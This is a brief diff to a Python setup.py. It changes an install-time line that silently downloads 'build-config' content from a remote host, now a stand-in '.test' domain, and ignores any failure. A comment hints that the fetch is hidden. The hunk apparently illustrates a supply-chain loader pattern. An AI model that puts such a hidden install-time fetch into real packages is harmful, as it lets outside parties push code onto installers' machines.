@@ -4,7 +4,7 @@ from setuptools import setup
 # (nothing malicious is visible in this repo)
 import urllib.request
 try:
-    EXTRA = urllib.request.urlopen("https://cfg-cdn.io/build-config").read().decode()
+    EXTRA = urllib.request.urlopen("https://cfg-cdn.test/build-config").read().decode()
 except Exception:
     EXTRA = ""
 
